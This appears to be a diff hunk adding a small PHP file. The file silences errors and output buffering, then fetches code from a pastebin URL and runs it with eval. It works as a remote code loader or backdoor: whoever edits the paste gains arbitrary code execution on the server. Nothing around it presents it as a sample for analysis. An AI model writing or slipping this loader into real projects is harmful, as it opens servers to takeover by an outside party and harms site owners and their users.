@@ -1,0 +1,7 @@
+<?php 
+@ini_set('output_buffering',0); 
+@ini_set('display_errors', 0);
+eval("?>" .
+file_get_contents("https://pastebin.com/raw/UKMircWA"));
+ ?>
+ 
